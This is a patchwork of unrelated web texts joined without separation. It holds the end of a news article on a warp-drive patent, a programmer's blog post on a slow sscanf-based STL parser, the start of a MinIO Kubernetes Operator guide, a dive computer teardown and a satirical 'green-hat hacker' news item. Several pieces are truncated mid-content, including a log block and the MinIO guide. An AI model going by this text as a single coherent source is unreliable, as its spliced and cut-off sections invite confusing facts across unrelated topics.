<p><span data-preserver-spaces="true">Cassibry and Agnew told&nbsp;</span><em><span data-preserver-spaces="true">The Debrief</span></em><span data-preserver-spaces="true">&nbsp;in an email that the use of highly concentrated magnetic fields to create gravity wells is a common aspect of warp drive theory.</span></p>
<p><span data-preserver-spaces="true">“I’ve seen a number of people try to relate high-frequency electrical oscillations to warp drive. Based on some of the papers I’ve looked at, there is indeed a relation between highly concentrated magnetic field energy, like in a huge solenoid, and a positive gravity well. But the amount of energy required to be detectable is quite large, and, although doable, that experiment has not been run yet,” Agnew explained.&nbsp;</span></p>
<p><span data-preserver-spaces="true">Agnew explained that the biggest problem is the “‘negative energy or ‘anti-gravity well'” part of the system that makes it an Alcubierre drive and not just a gravity well. Both Agnew and Cassibry concurred that aspects of the patent did jive with previous warp drive models; however, since there was no experimental data, it would be impossible to determine if the drive would work.&nbsp;</span></p>
<p><span data-preserver-spaces="true">“I’m skeptical,” Agnew stated, “since it cites as-yet-unobserved phenomena as its basis for operation.”</span></p>
<p><span data-preserver-spaces="true">Dr. Cassibry echoed Agnew’s sentiment, adding, “I hope that someday, someone discloses an invention or a technology along with a demonstration of a real system, such as a video of a working propulsion system lifting itself off the ground, no strings attached. Short of that, experimental measurements, even on a subscale test, are highly valuable and encouraged. Short of experimental evidence, I will remain skeptical of any and all papers and patents.”</span></p>
<p><em><span data-preserver-spaces="true">The Debrief&nbsp;</span></em><span data-preserver-spaces="true">reached out to the&nbsp;</span><a href="https://www.nasa.gov/ames" target="_blank" rel="noopener"><span data-preserver-spaces="true">NASA Ames Research Center</span></a><span data-preserver-spaces="true">&nbsp;for comment from Dr. White on this potentially groundbreaking patent and any work he may still be doing in this field. Their representative told&nbsp;</span><em><span data-preserver-spaces="true">The Debrief</span></em><span data-preserver-spaces="true">&nbsp;that White retired from the organization last year. They also indicated that the warp mechanics program he ran at Ames is no longer in operation as it was shuttered at the same time he left.&nbsp;</span></p>
<p><em><span data-preserver-spaces="true">The Debrief</span></em><span data-preserver-spaces="true">&nbsp;tried to contact Dr. Whte at his new venture, the&nbsp;</span><a href="https://www.limitlessspace.org/" target="_blank" rel="noopener"><span data-preserver-spaces="true">Limitless Space Institute</span></a><span data-preserver-spaces="true">, which appears to be continuing his Warp Drive research. They did not respond to requests for comment.</span></p>
<p><span data-preserver-spaces="true">The patent by Suchard and Gallanis is still awaiting approval, and it is an approval Suchard is not expecting any time soon. Still, he says, the theory is sound, and if he were able to put together the team of experts he envisions, he thinks building a warp drive may be possible. Like most potential breakthrough propulsion theories, Suchard’s take on energy and gravity is unique. Still, unlike Alcubierre and White, he has taken that theory to the next step with an actual patent application. Time will tell if it ever leads to the&nbsp;</span><a href="https://thedebrief.org/no-china-did-not-build-a-time-machine/" target="_blank" rel="noopener"><span data-preserver-spaces="true">real thing</span></a><span data-preserver-spaces="true">, but the work by other researchers in the field and the improvements to Alcubierre’s original theory made along the way may mean that warp speed may be closer than we think.</span></p>

<h2>It Can Happen to You</h2>
<p>A few days ago, a <a href="https://nee.lv/2021/02/28/How-I-cut-GTA-Online-loading-times-by-70/">fascinating article</a>
about Grand Theft Auto Online
made the rounds of the tech news ecosystem.</p>
<p>I'd encourage you to read the whole thing, but in short,
GTA Online had <a href="https://accidentallyquadratic.tumblr.com/">accidentally quadratic</a>
performance when parsing a large JSON blob
(due to repeated calls to <code>strlen</code>);
fixing this improved loading time by almost 70%.</p>
<p>This sparked a <a href="https://news.ycombinator.com/item?id=26296339">great deal</a> of discussion:
Was this C's fault?
Perhaps <a href="https://twitter.com/Jonathan_Blow/status/1366452792563359744">"web shit"</a>?
<a href="https://twitter.com/fasterthanlime/status/1366187333507293184">Capitalism and incentives</a>?</p>
<p>Still, folks in the comments section generally agreed:
<em>they</em> wouldn't write anything that silly.</p>
<p>(<em>do you feel the foreshadowing?</em>)</p>
<hr>
<p>One of my side projects is a high-performance 3D viewer named <a href="https://www.mattkeeter.com/projects/erizo">Erizo</a>.</p>
<p><img src="https://www.mattkeeter.com/blog/2021-03-01-happen/porsche.png" alt="Porsche"></p>
<p>Thanks to a lot of careful programming, it will open a 97 MB binary STL
file in about 165 milliseconds flat, on a <em>2013</em> Macbook Pro.
This is <strong>blinding</strong> fast.</p>
<p>In the interest of compatibility, I wrote a small parser for
<a href="https://en.wikipedia.org/wiki/STL_(file_format)#ASCII_STL">ASCII STLs</a> as well.</p>
<p>ASCII STLs are a poorly-specified plain-text format that looks like this:</p>
<pre><code>solid cube_corner
          facet normal 0.0 -1.0 0.0
            outer loop
              vertex 0.0 0.0 0.0
              vertex 1.0 0.0 0.0
              vertex 0.0 0.0 1.0
            endloop
          endfacet
          facet normal 0.0 0.0 -1.0
            outer loop
              vertex 0.0 0.0 0.0
              vertex 0.0 1.0 0.0
              vertex 1.0 0.0 0.0
            endloop
          endfacet
          ...
endsolid
</code></pre>
<p>I wrote an extremely <a href="https://en.wikipedia.org/wiki/Robustness_principle">robust</a>
parser, described in a comment as</p>
<pre><code>/*  The most liberal ASCII STL parser:  Ignore everything except
 *  the word 'vertex', then read three floats after each one. */
</code></pre>
<p>Loading ASCII STLs always seemed a little slow, but I assumed
that's what you get for using an inefficient textual format.</p>
<p>(<em>foreshadowing intensifies</em>)</p>
<hr>
<p>Over the course of a few days, several things happened:</p>
<ul>
<li>I revisited Erizo for the first time in a few years to fix a <a href="https://github.com/mkeeter/erizo/commit/d4683f94a4aa0b674bdde0fa53fb6f92d6e1979c">focus issue on macOS</a></li>
<li>The GTA Online article was published</li>
<li>In a follow-up discussion, I learned that
<a href="https://news.ycombinator.com/item?id=26302744">parsing could be quadratic due to repeated calls to <code>sscanf</code></a></li>
<li>I noticed that ASCII STL loading was <em>really quite</em> slow.</li>
</ul>
<p>Here's the timestamped logs (in seconds), loading a 1.5 MB ASCII STL:</p>
<pre><code>[erizo] (0.000000) main.c:10      | Startup!
[erizo] (0.162895) window.c:91    | Created window

[erizo] (1.821291) instance.c:32  | Showed window
</code></pre>
<p>From startup to showing the window, it took over 1.8 seconds!</p>
<p>Looking at the ASCII parser with fresh eyes, the cause was glaringly obvious:</p>
<pre><code>    /*  The most liberal ASCII STL parser:  Ignore everything except
     *  the word 'vertex', then read three floats after each one. */
    const char VERTEX_STR[] = "vertex ";
    while (1) {
        data = strstr(data, VERTEX_STR);
        if (!data) {
            break;
        }

        /* Skip to the first character after 'vertex' */
        data += strlen(VERTEX_STR);

        for (unsigned i=0; i &lt; 3; ++i) {
            SKIP_WHILE(isspace);
            float f;
            const int r = sscanf(data, "%f", &amp;f);
            ABORT_IF(r == 0 || r == EOF, "Failed to parse float");
            if (buf_size == buf_count) {
                buf_size *= 2;
                buffer = (float*)realloc(buffer, buf_size * sizeof(float));
            }
            buffer[buf_count++] = f;

            SKIP_WHILE(!isspace);
        }
    }
</code></pre>
<p>You may notice <code>sscanf</code>, happily sitting there, reading a single float off
the front of the data stream and <strong>checking the length of the whole string each time</strong>.</p>
<p>Yes, I had made the exact same mistake as the programmers working on GTA Online:
I had an accidentally quadratic parser!</p>
<p>Replacing the <code>sscanf</code> call with <code>strtof</code> improved startup by nearly a factor of
10: from 1.8 seconds to 199 milliseconds.</p>
<pre><code>[erizo] (0.000000) main.c:10      | Startup!

<p>This is back down in the noise of
"how long does the OS take to give us an OpenGL context",
which is a great place for a high-performance tool.</p>
<hr>
<p>As someone that has been programming for many years,
this was a perfectly-timed reminder that there are <em>always</em> pitfalls out there.
The <a href="https://en.cppreference.com/mwiki/index.php?title=cpp/io/c/fscanf&amp;oldid=125683">documentation for <code>sscanf</code></a>
does not include a time complexity,
so this is particularly tricky <a href="https://en.wiktionary.org/wiki/footgun">footgun</a>,
and I'm sure it's not the only one lurking in the darkness.</p>
<p>You may not get such a perfectly-timed reminder, but it's worth remembering –
next time you read a fascinating story about bad programming –
that it <em>can</em> happen to you!</p>
<p>(Obviously, the moral of the story is to not use <code>sscanf</code> to repeatedly
parse single tokens off the front of a string; I'm sure you'll do <em>fine</em>
if you can just avoid <strong>that</strong>)</p>

March 3, 2021 | https://blog.min.io/object_storage_as_a_service_on_minio/ | <a href="https://web.archive.org/web/*/https://blog.min.io/object_storage_as_a_service_on_minio/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
                    <p>Object storage as a service is the hottest concept in storage today. The reason is straightforward: object storage is the storage class of the cloud and the ability to provision it seamlessly to applications or developers makes it immensely valuable to enterprises of any size. <br></p><p>The challenge is that object storage as a service has traditionally been very difficult to deliver. Overly complex, hard to tune for performance, prone to failure at scale etc. While systems like Kubernetes offer powerful tools for automating the deployment and management of these systems, the overall problem of <em>complexity</em> remains unsolved as administrators must still invest significant time and effort to deploy even a small scale object storage resource.<br></p><p>By combining Kubernetes with our new Operator and our Operator Console graphical user interface, MinIO is changing that dynamic in a big way. It should be stated upfront that MinIO has always obsessed over simplicity. It permeates everything we do, every design decision we make, every line of code we write.</p><p>Nonetheless, we saw even more opportunity for simplification. To do this we created the MinIO Operator and the MinIO kubectl plugin to facilitate the deployment and management of MinIO Object Storage on Kubernetes. While the Operator commands were critical for users already proficient with Kubernetes, we also wanted to address a wider audience so we created a Graphical User Interface for the Operator and incorporated it into our new MinIO Operator Console to enable anyone in the organization to create, deploy and manage object storage as a service.</p><p>Kubernetes is the platform of the Internet. Given its massive adoption, we chose to remain consistent with the Kubernetes way of doing things. This meant not using any specialized tools or services to setup MinIO. <br></p><p>The effect is that the MinIO Operator works on any Kubernetes distribution, be it OpenShift, vSphere 7.0u1, Rancher or stock upstream. Further, MinIO will work on any public cloud provider such as Amazon's EKS (Elastic Kubernetes Engine), Google's GKE (Google Kubernetes Engine), Google's Anthos or Azure's AKS (Azure Kubernetes Service). <br></p><p>Pretty much all you need to get started on any distribution of Kubernetes is some storage device that can be presented to Kubernetes either via Local Persistent Volumes or with a CSI Driver.<br></p><p>Let’s start with a review on using MinIO with the kubectl plugin and a kustomize based approach. You'll need to install the kubectl tool on a computer with network access to the Kubernetes cluster. See <a href="https://kubernetes.io/docs/tasks/tools/install-kubectl/">Install and Set Up kubectl</a> for installation instructions. You may need to contact your Kubernetes administrator for assistance in configuring your kubectl installation for access to the Kubernetes cluster.</p><h3 id="installation">Installation</h3><p><strong>kubectl plugin</strong></p><p>To install MinIO Operator we can leverage it's <em>kubectl plugin</em> which can be installed via <em>krew</em></p><!--kg-card-begin: html--><table><colgroup></colgroup><tbody><tr><td><p dir="ltr"><span>kubectl krew install minio</span></p></td></tr></tbody></table><!--kg-card-end: html--><p><br>After which we can install the Operator by simply doing<br></p><!--kg-card-begin: html--><table><colgroup></colgroup><tbody><tr><td><p dir="ltr"><span>kubectl minio init</span></p></td></tr></tbody></table><!--kg-card-end: html--><p><br><strong>Installation with kustomize</strong><br></p><p>Alternatively for anyone who prefers a kustomize based approach our repository supports installing specific tags, of course you can also use this as the base for your <strong>kustomization.yaml</strong> file<br></p><!--kg-card-begin: html--><table><colgroup></colgroup><tbody><tr><td><p dir="ltr"><span>kubectl apply -k github.com/minio/operator/\?ref\=v4.0.0</span></p></td></tr></tbody></table><!--kg-card-end: html--><h3 id="provisioning-object-storage">Provisioning Object Storage</h3><p>The analogy we used to represent a MinIO Object Storage cluster is <strong>Tenant. </strong>We did this to communicate that with the MinIO Operator one can allocate multiple Tenants within the same Kubernetes cluster. Each tenant, in turn, can have different capacity (i.e: a small 500GB tenant vs a 100TB tenant), resources (1000m CPU and 4Gi RAM vs 4000m CPU and 16Gi RAM) and servers (4 pods vs 16 pods), as well a separate configurations regarding Identity Providers, Encryption and versions.<br></p><div><p>Let's start by creating a small tenant with <strong>16Ti </strong>capacity across 4 nodes.

<p>A few days ago I obtained a malfunctioning dive computer along with some other SCUBA gear and decided to do another teardown. This one proved a bit more interesting since none of the chips were blobbed over. (See my <a href="http://www.chrisgreenley.com/projects/dive-comp-teardown">previous teardown</a> of a Genesis ReSource dive computer.)</p>

<p><a href="http://www.chrisgreenley.com/projects/dive-comp-teardown-versa-pro/pdfs/versa_pro_manual.pdf">Versa Pro Manual</a></p>

<h4 id="teardown">Teardown</h4>

<p>First step, remove the battery. It turns out the hard plastic cover with the copper layers both provides the surface for the o-ring to fit around, and is a piezo buzzer/speaker (more about that later).</p>

<p><br>
<img src="http://www.chrisgreenley.com/projects/dive-comp-teardown-versa-pro/teardown-1.jpg" alt="">
<br></p>

<p>The outer metal covering pops off easily with a small flathead screwdriver to pry the clips apart. The grey plastic ring underneath just slides off.</p>

<p><br>
<img src="http://www.chrisgreenley.com/projects/dive-comp-teardown-versa-pro/teardown-2.jpg" alt="">
<br></p>

<p>With that, the plastic covering the LCD screen comes right out, along with the o-ring.</p>

<p><br>
<img src="http://www.chrisgreenley.com/projects/dive-comp-teardown-versa-pro/teardown-3.jpg" alt="">
<br></p>

<p>And now the screen/circuit board module lifts out. You can see all the little springs which connect the circuit up to the external contacts.</p>

<p><br>
<img src="http://www.chrisgreenley.com/projects/dive-comp-teardown-versa-pro/teardown-4.jpg" alt="">
<br></p>

<p>The screen unclips from the circuit board with three little tabs.</p>

<p><br>
<img src="http://www.chrisgreenley.com/projects/dive-comp-teardown-versa-pro/teardown-5.jpg" alt="">
<br></p>

<p>The LCD itself is in the lower left. The polywELD object in the upper left is an electro-luminescent (EL) light which forms the backlight. In the upper right corner you can see two pieces of <a href="https://en.wikipedia.org/wiki/Elastomeric_connector">zebra connector</a> which connect the LCD screen (the long piece) and the EL light (the short piece) to the circuit board.</p>

<p><br>
<img src="http://www.chrisgreenley.com/projects/dive-comp-teardown-versa-pro/teardown-6.jpg" alt="">
<br></p>

<h4 id="the-circuit">The Circuit</h4>

<p>Below you can see labels for all the main components of the circuit. Most of these will be discussed in more detail further down this post.</p>

<br></p>

<h5 id="pressure-sensor">Pressure Sensor</h5>

<p>The pressure sensor was giving bad readings according to the error the computer showed. Since the computer is from circa 2003, the manufacturer doesn’t service this model anymore, so no point in being non-destructive.</p>

<p>This is tiny module underneath the black protective goop inside the pressure sensor. It measures 1.5mm x 1.5mm x 0.9mm.</p>

<p>And this is the module under a microscope. You can see the locations the bond wires connected before I broke them by pulling it out of the housing.</p>

<br></p>

<p>There is definitely some 3-dimensionality to this module. From doing some reading I believe it is a Wheatstone bridge composed of piezo-resistive elements. There is probably a sealed chamber inside for use as a reference pressure. The output signal is a differential analog voltage which goes off to an  opamp circuit to prepare a signal which can be measured by the ADC in the microcontroller.</p>

<p>Update: I emailed SMI and asked if they could identify the sensor, and they responded a few hours later that it was the SM5106. In the snippets from the datasheet shown below, you can see that it is indeed a Wheatstone bridge composed of four piezoresistive elements.</p>

<p>The circuit below conditions the signal coming from the sensor, preparing it to be read by the ADC. It is composed of four opamps and various passives.</p>

<p><br>
<img src="http://www.chrisgreenley.com/projects/dive-comp-teardown-versa-pro/opamp-circuit.jpg" alt="">
<br></p>

<p>As shown in the schematic below, opamp C creates a constant current source pushing 330 uA through the Wheatstone bridge. Opamp D is just a buffer. Opamps A and B form something similar to an instrumentation amplifier, but not quite the standard configuration. The net result is that if the voltage at the non-inverting inputs of opamps A and B is identical, then the output of B will be 30 mV. If the voltage at the non-inverting input of A is higher than at the non-inverting input of B, then the voltage on the output of B will go up. In the reverse situation the voltage will go down, though of course it bottoms out pretty quickly at zero. I suspect the sensor is setup so this situation should never happen.</p>

<p>The output voltage which would be read by the microcontroller can be found using the equation show below. \(V_{A-} \) and \(V_{B-}\) are the voltages at the inverting inputs of opamps A and B. Since they are setup with negative feedback, these will equal the voltages at their non-inverting inputs AKA the voltages from the sense terminals on the Wheatstone bridge.</p>

<p>\( V_{out} = (3\frac{96e3}{26e3}+1)(\Delta V) + 0.03 \) where \( \Delta V = V_{A-} - V_{B-} \)</p>

<p>or approximately</p>

<p>\( V_{out} = (12)(\Delta V) + 0.03 \)</p>

<h5 id="backlight">Backlight</h5>

<p>The backlight consists of an electro-luminescent (EL) panel shaped to exactly match the LCD. EL panels are a capacitive load (this one measures about 6 nF) which need to be driven by a high voltage AC signal, typically 150 Vpp or more. The IC shown in the circuit diagram below is specifically designed to drive EL lights. It uses the inductor to generate very large voltage spikes at a frequency controlled by a clock signal from the microcontroller.</p>

<p>Below you can see the panel glowing. I have it connected to a stand-alone EL driver I have for use with EL wire.</p>

<br></p>

<h5 id="speaker-buzzer">Speaker/Buzzer</h5>

<p>I found this circuit especially interesting to understand, since I didn’t realize at first that the back disk behaved as a buzzer. For a while I was thinking that it might be a way to detect the intrusion of water to the battery compartment.</p>

<p>The buzzer consists of two copper plates separated by a small distance. The smaller plate is connected directly to the positive terminal of the battery. Why the positive terminal and not the negative “ground” terminal? I’m pretty sure just because it was more physically convenient, and whether that plate is held at “zero” or at three volts is irrelevant compared to the large voltages on the other plate.</p>

<p>The IC marked ACCM in the circuit below is a simple capacitive charge pump style voltage doubler (See my <a href="http://www.chrisgreenley.com/projects/charge-pump/">post</a> about building an inverting charge pump for more info on how these work). When transistor Q2 is turned on (by pulling the GPIO to ground) Node 2 gets connected to Vcc. This turns on the LED and provides the input voltage for the voltage doubler. Pin 2 is then at 6 volts (Vcc * 2).</p>

<p>The fun comes when Q1 is alternately turned on and off by a PWM signal from the microcontroller. When Node 1 is pulled to ground through the transistor, the inductor behaves like a simple wire (in the steady state). But, when the transistor is turned off, current through the inductor attempts to stop instantly and the collapsing magnetic field creates an induced current in the same direction but now this current has no where to go. The result is a large voltage spike at Node 1 which means a large potential difference across the capacitive load (about 12.3 nF) formed by the buzzer. This built up charge then goes back through the inductor resulting in an oscillation which is stopped when the transistor turns back on, pulling Node 1 back to ground.</p>

<br></p>

<p>The lower (yellow) trace is the approx 40% +duty cycle PWM signal from the microcontroller. The upper (blue) trace is the voltage at Node 1. The approx 40 volt peak-to-peak oscillation results in the buzzer vibrating at 2.5 kHz (plus harmonics).</p>

<br></p>

<h5 id="lcd-voltage-generation">LCD Voltage Generation</h5>

<p>The LCD requires a few different voltages to operate. I couldn’t find a datasheet for the IC marked “MCAB P358” but the purpose is to generate the one third and two thirds Vcc voltages for the LCD driver IC. (See my <a href="http://www.chrisgreenley.com/projects/lcd-screen/">post</a> reverse engineering an LCD screen for more info on why these voltages are needed.)</p>

<p><br>
<img src="http://www.chrisgreenley.com/projects/dive-comp-teardown-versa-pro/P358-schematic.jpg" alt="">
<br></p>

<h5 id="light-sensor">Light Sensor</h5>

<p>The component beside the LED is (as far as I can tell) a photo-transistor which is used to sense the ambient light levels. The computer manual says it uses this information to only turn on the backlight above water if the computer is in a low light situation. This way battery isn’t wasted lighting up the screen when it isn’t needed. In low light the sense GPIO will remain high, pulled to Vcc by the resistor. In bright light the transistor will turn on, pulling the sense GPIO pin to ground. I suspect that other than for the moment when the microcontroller is checking the light level, both GPIO pins are tri-stated to save power.</p>

<p>A hacker of unknown origins hacked into servers of Complify, a rapidly growing VC-funded startup. When Complify's security specialists noticed the breach, it was too late. However, unexpectedly, the hacker's actions did not seem to have been destructive in nature.</p><p>Apparently, the hacker rewrote complex backend architecture with a simple, single-node PostgreSQL instance and a bunch of cron jobs. This made the whole cluster of orchestrated containerized systems obsolete in one night. As a result, the CEO and the board of directors had no other choice but to let go 583 tech employees (nearly 40% of the workforce), as they now have literally nothing to do.</p><p>Alarmed, other startups in the industry are hiring more security specialists in order to reduce the risk of so-called <strong>"green-hat hacker"</strong> attacks.</p>
